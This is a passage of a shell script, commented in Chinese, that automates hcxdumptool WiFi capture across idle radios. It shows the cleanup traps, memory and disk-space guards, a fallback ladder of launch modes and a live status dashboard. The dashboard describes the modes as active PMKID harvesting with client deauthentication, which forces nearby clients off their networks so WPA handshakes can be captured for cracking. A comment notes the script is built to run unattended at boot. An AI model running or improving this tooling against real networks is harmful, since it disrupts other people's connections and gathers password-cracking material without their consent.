            log "${yellow}锁内 PID(${OLD_PID}) 不是本脚本进程, 视为失效锁直接清理(不触碰该进程)${none}"
        fi
    else
        log "${yellow}清理失效的运行锁...${none}"
    fi
    rm -f "${LOCK}"
fi
echo $$ > "${LOCK}"

#HUP/INT/TERM 收尾 & EXIT 清理(统一出口, 幂等)
#  - 信号(INT/TERM/HUP) -> do_cleanup_exit: 清理 + exit 130(内存守卫触发的收尾为 131)
#  - 正常退出 -> EXIT trap -> cleanup_on_exit: 清理 + 透传退出码
#  - CLEANING 重入保护: 清理期间再按信号立即退出, 不重复清理
CLEANING=0
MEMGUARD_STOPPED=0          # 1 = 本次收尾由内存守卫触发(退出码 131, 区别于人工 Ctrl-C 的 130)
SPACEGUARD_STOPPED=0        # 1 = 本次收尾由空间守卫触发(退出码 132)

# 把"退出原因"写进终端与会话日志。收尾出口共用同一份文案:
# 无论信号路径(do_cleanup_exit)还是守卫 break 后走到的那条普通出口, 日志里都能看到
# 为什么停的、退出码是多少 —— 事后翻会话日志不会只剩一个光秃秃的"退出码: N"。
log_exit_reason() {
    log "${yellow}退出原因: $1, 退出码 $2; 已抓数据见上方文件列表${none}"
}
do_cleanup_exit() {
    if [ "${CLEANING}" = "0" ]
    then
        CLEANING=1
        cleanup_capture
    else
        # 收尾进行中又收到第二个信号(例如空间守卫已触发收尾、用户等不及又按了 Ctrl-C):
        # 不重复整套收尾, 但必须把"杀进程/删监听口/删锁"这几件事补掉, 否则半截收尾会留下
        # hcxmon* 接口和运行锁(射频被占, 下次启动要人工清)。cleanup_leftovers 幂等, 安全。
        cleanup_leftovers
    fi
    if [ "${MEMGUARD_STOPPED}" = "1" ]
    then
        log_exit_reason "内存守卫主动收尾(内存不足)" 131
        exit 131
    fi
    if [ "${SPACEGUARD_STOPPED}" = "1" ]
    then
        log_exit_reason "空间守卫主动收尾(剩余空间不足)" 132
        exit 132
    fi
    log_exit_reason "收到中断信号(INT/TERM/HUP)" 130
    exit 130
}
cleanup_on_exit() {
    st=$?
    if [ "${CLEANING}" = "0" ]
    then
        CLEANING=1
        cleanup_capture
    else
        # 同 do_cleanup_exit: 收尾中途退出也要保证监听口/锁不残留(幂等)
        cleanup_leftovers
    fi
    [ "${MEMGUARD_STOPPED}" = "1" ] && st=131
    [ "${SPACEGUARD_STOPPED}" = "1" ] && st=132
    log "${yellow}退出码: ${st}${none}"
}
trap "do_cleanup_exit" INT TERM HUP
trap "cleanup_on_exit" EXIT

# 启动内存守卫基线检查
init_mem_guard

#清理残留监听接口和外部进程
sweep_stale_ifaces

#检测空闲射频
detect_idle_radios

if [ -n "${BUSY_RADIOS}" ]
then
    log "${cyan}正在使用的射频(跳过):${none}"
    for r in ${BUSY_RADIOS}
    do
        log "  ${r}"
    done
fi
if [ -n "${IDLE_RADIOS}" ]
then
    log "${green}空闲射频(将用于抓包):${none}"
    for r in ${IDLE_RADIOS}
    do
        log "  ${r}"
    done
else
    log "${yellow}没有检测到空闲射频, 当前无线均在使用中${none}"
    log "${yellow}为不影响你现有的WiFi, 本脚本不会占用它们; 请先停用一个不用的接口再运行${none}"
    rm -f "${LOCK}"
    exit 0
fi

# 一轮完整启动: 建监听口 -> 起抓包 -> 3 秒后验活; 至少一路活着返回 0
capture_round() {
    CREATED_IFS=
    PIDS=
    OUT_FILES=
    RUNLOGS=
    for r in ${IDLE_RADIOS}
    do
        create_raw_monitor "${r}"
    done
    if [ -z "${CREATED_IFS}" ]
    then
        return 1
    fi
    for drv in ${CREATED_IFS}
    do
        OUT=$(next_cap_file "${drv}")
        # 防御: 输出路径为空则摘除该路接口并跳过
        if [ -z "${OUT}" ]
        then
            log "${red}${drv} 生成输出路径失败(空), 已删除该接口并跳过这一路${none}"
            iw dev ${drv} del >/dev/null 2>&1
            NEW_IFS=
            for d in ${CREATED_IFS}
            do
                [ "${d}" = "${drv}" ] || NEW_IFS="${NEW_IFS} ${d}"
            done
            CREATED_IFS=${NEW_IFS# }
            continue
        fi
        seqpart=$(basename "${OUT}" | sed -n 's/^.*_\([0-9][0-9]*\)\.pcapng$/\1/p')
        LF="${CAP_DIR}/run_${drv}_${seqpart}.log"
        OUT_FILES="${OUT_FILES} ${OUT}"
        RUNLOGS="${RUNLOGS} ${LF}"
        eval "OUTPK_${drv}=\"${OUT}\""
        eval "LFPK_${drv}=\"${LF}\""
        # [日志加固] 按方言/频段把实际启动命令写进该路日志首行: 日志自描述, 排障直接对上参数
        hcx_launch "${drv}" "${OUT}" "${LF}"
        PIDS="${PIDS} ${HCX_LAST_PID}"
        eval "PIDPK_${drv}=\"${HCX_LAST_PID}\""
        log "${green}抓包已启动: ${drv} -> ${OUT} (PID=${HCX_LAST_PID}) 参数: ${CMDLINE}${none}"
    done
    sleep 3
    verify_captures
    if [ -z "${CREATED_IFS}" ]
    then
        purge_empty_captures
        return 1
    fi
    return 0
}

# 抓包: 按阶梯最多 3 档 —— 首选方言全参 -> 另一方言全参 -> 首选方言降参
# [2026-10-18] 无论 auto 还是被 HCX_DIALECT 指定的"优先方言", 都走完整阶梯:
#   脚本可能被设成开机自启、无人值守, 没人在旁边看清楚后手动重跑,
#   所以宁可多试两档(每档命令行与工具原文都留档)也不要一次就放弃。
while next_attempt
do
    if capture_round
    then
        break
    fi
    log "${red}第 ${HCX_ATTEMPT} 档(方言 ${HCX_MODE}/${HCX_VARIANT})全部抓包进程未能运行${none}"
    log "${yellow}本档的完整命令行与工具原文见 ${CAP_DIR}/run_*.log, 自动进入下一档${none}"
done
if [ -z "${CREATED_IFS}" ]
then
    log "${red}已试遍所有档位(${HCX_TRIED# }), 仍未能运行, 全部清理后退出${none}"
    log "${yellow}建议: 确认有空闲射频 / 改用 aircrackNG 路线 / 检查 hcxdumptool 版本与驱动支持${none}"
    CLEANING=1
    cleanup_capture
    exit 1
fi

echo ""
if [ "${VIEW_ON}" = "1" ]
then
    log "${magenta}正在并行抓包(${CREATED_IFS})... 方言=${HCX_MODE}/${HCX_VARIANT}(第 ${HCX_ATTEMPT} 档), 每 ${REFRESH_SECS} 秒一帧实时视图, 按 Ctrl-C 停止并自动清理${none}"
else
    log "${magenta}正在并行抓包(${CREATED_IFS})... 方言=${HCX_MODE}/${HCX_VARIANT}(第 ${HCX_ATTEMPT} 档)${none}"
    log "${yellow}实时视图已关(stdout 不是终端): 不打帧, 免得每帧约1KB的ANSI把重定向文件灌满; 进度只写会话日志${none}"
    log "${yellow}想要实时视图: 在终端里直接跑, 或者加 VIEW=on 强制打开${none}"
fi
case "${SPACE_ON}" in
    1) log "${yellow}空间守卫: 剩余空间 <= ${MIN_FREE_KB}KB 时主动收尾(${SPACE_SRC}; 每 ${MIN_FREE_CHECK} 帧查一次, 当前剩余 $(free_kb)KB)${none}" ;;
    2) log "${yellow}空间守卫: MIN_FREE_KB='${MIN_FREE_KB}' 不是整数也不是 off, 守卫不启用${none}" ;;
esac
log "${magenta}hcxdumptool 明细输出已存入: ${CAP_DIR}/run_<接口>_####.log${none}"
echo ""

# 实时多路极轻量仪表盘: 每 REFRESH_SECS 秒刷新(仅 stdout 是终端时; 否则只打心跳, 见 VIEW_ON)
# [性能与零争用重构] 彻底解除对 run_*.log 的每秒读写争用与 grep 扫描, 直接由内核读取实时信道
rm -f "${GUARD_FLAG}" >/dev/null 2>&1     # 清掉上次可能残留的触发标记
rm -f "${SPACE_FLAG}" >/dev/null 2>&1
MAIN_PID=$$

SECS=0
FRAMES=0
set -- ${CREATED_IFS}
NR=$#

# 终端初次整屏清屏
[ "${VIEW_ON}" = "1" ] && printf '\033[2J\033[H'

# 主循环前预取一次磁盘剩余(避免每2秒在主循环中重复fork df)
_cur_disk=$(free_kb)

while true
do
    if all_dead ${PIDS}
    then
        break
    fi
    sleep "${REFRESH_SECS}"
    SECS=$((SECS + REFRESH_SECS))
    FRAMES=$((FRAMES + 1))

    # [进程精简] 内存守卫: 纯 Shell 原生内嵌检查(0 子进程, 彻底消除后台常驻进程)
    if ! check_mem_guard
    then
        break
    fi

    # 空间守卫与磁盘采样: 每 3 帧(约 6 秒)采样一次, 彻底解耦终端 2 秒刷新与外部进程派生
    if [ $((FRAMES % 3)) -eq 0 ]
    then
        _fkn=$(free_kb)
        [ -n "${_fkn}" ] && _cur_disk="${_fkn}"
        if [ "${SPACE_ON}" = "1" ]
        then
            case "${_cur_disk}" in
                ''|*[!0-9]*) ;;    # 读不到/解析失败: 不动作, 等下一轮
                *) if [ "${_cur_disk}" -le "${MIN_FREE_KB}" ]
                   then
                       echo ""
                       log "${red}空间守卫: ${CAP_DIR} 剩余 ${_cur_disk}KB <= 阈值 ${MIN_FREE_KB}KB, 主动收尾避免写满分区${none}"
                       log "${yellow}已抓到的文件在 ${CAP_DIR}, 请尽快导出${none}"
                       : > "${SPACE_FLAG}" 2>/dev/null    # 标记退出原因(收尾出口据此用 132 退出)
                       break
                   fi ;;
            esac
        fi
    fi

    # 统计各路存活状态与存活总数 (0 外部子进程)
    _live_cnt=0
    for drv in ${CREATED_IFS}
    do
        eval "p=\"\$PIDPK_${drv}\""
        if [ -n "${p}" ] && kill -0 "${p}" 2>/dev/null; then
            _live_cnt=$((_live_cnt + 1))
        fi
    done

    if [ "${VIEW_ON}" != "1" ]
    then
        # 非交互终端: 一帧都不打(不写 ANSI, 彻底保护 Flash 小容量存储),
        # 仅按心跳周期向会话日志写入一行纯文本, 记录持续运行状态
        if [ $((FRAMES % VIEW_HEARTBEAT)) -eq 0 ] && [ -n "${SESSION_LOG}" ]
        then
            printf '%s 心跳: 已抓包 %ss, %s/%s 路存活(%s)\n' "$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)" "${SECS}" "${_live_cnt}" "${NR}" "${CREATED_IFS}" >> "${SESSION_LOG}" 2>/dev/null
        fi
        continue
    fi

    # 光标复位左上角覆盖刷新 (消除全屏清屏引起的闪烁与抽搐感)
    printf '\033[H'
    printf '%s\033[K\n' "================================================================"
    if [ "${HCX_MODE}" = "new" ]
    then
        _mode_tag="6.3.x 双轨主动加速收割档 (AP*${ATTEMPT_AP_MAX}/Client-Deauth*${ATTEMPT_CLIENT_MAX}/无假信标)"
    else
        _mode_tag="6.2.x 原生单播主动PMKID+Deauth档 (无假信标)"
    fi
    printf "  [已抓包 %5ss] %d/%d 路存活 | 模式: %s\033[K\n" "${SECS}" "${_live_cnt}" "${NR}" "${_mode_tag}"
    printf "  说明: 文件大小含信标(Beacon); 抓取握手需客户端连网或路由支持PMKID\033[K\n"
    printf "  按 Ctrl-C 停止并安全收尾 | 明细日志保留在: %s/run_*.log\033[K\n" "${CAP_DIR}"
    printf '%s\033[K\n' "================================================================"
    printf "  %-10s %-8s %-24s %-12s %s\033[K\n" "接口" "频段" "当前跳频信道" "抓包文件大小" "状态"

    for drv in ${CREATED_IFS}
    do
        eval "f=\"\$OUTPK_${drv}\""
        eval "bd=\"\$BAND_${drv}\""
        eval "p=\"\$PIDPK_${drv}\""

        # 1. 尝试向内核读取实时跳频信道(宽容匹配数字信道，读取失败则回退到当前频段跳频范围)
        _ch_num=$(iw dev "${drv}" info 2>/dev/null | sed -n 's/.*channel \([0-9][0-9]*\).*/\1/p;q')
        eval "_def_ch=\"\$CH_RANGE_${drv}\""
        [ -z "${_def_ch}" ] && _def_ch="跳频中..."
        if [ -n "${_ch_num}" ]; then
            ch="跳频中 (信道 ${_ch_num})"
        else
            ch="${_def_ch}"
        fi

        # 2. 仅读取 pcapng 文件元数据大小, set -- 解析消除 awk 外部子进程
        sz=""
        if [ -f "${f}" ]; then
            set -- $(ls -lh "${f}" 2>/dev/null)
            sz="$5"
        fi
        [ -z "${sz}" ] && sz="0 B"

        _st_tag="[运行正常]"
        if [ -n "${p}" ] && ! kill -0 "${p}" 2>/dev/null; then
            _st_tag="${red}[已退出]${none}"
        fi

        printf "  %-10s %-8s %-24s %-12s %b\033[K\n" "${drv}" "${bd:-未知}" "${ch}" "${sz}" "${_st_tag}"
    done

    # 底部打印系统守卫指标(直接复用缓存的 _cur_disk，不再每 2 秒重复 fork df)
    _cur_mem=$(mem_avail_mb)
    printf '%s\033[K\n' "----------------------------------------------------------------"
    printf "  系统守卫: 磁盘剩余 %s KB | 内存可用 %s MB\033[K\n" "${_cur_disk:-未知}" "${_cur_mem:-未知}"
    printf '%s\033[K\n' "================================================================"
done

CLEANING=1    # 正常收尾已在此显式执行, EXIT 陷阱不再二次清理(避免再等一轮轮询)
cleanup_capture
# 收尾后把原因也写进日志(不只信号那条路径): 守卫 break 出来就走到这里,
# 退出码用可区分的 131/132, 其余(抓包进程全死等)照旧 0。
if [ "${SPACEGUARD_STOPPED}" = "1" ]
then
    log_exit_reason "空间守卫主动收尾(剩余空间不足)" 132
    log "${yellow}正在退出程序...${none}"
    exit 132
fi
if [ "${MEMGUARD_STOPPED}" = "1" ]
then
    log_exit_reason "内存守卫主动收尾(内存不足)" 131
    log "${yellow}正在退出程序...${none}"
    exit 131
fi
log "${yellow}正在退出程序...${none}"
exit 0
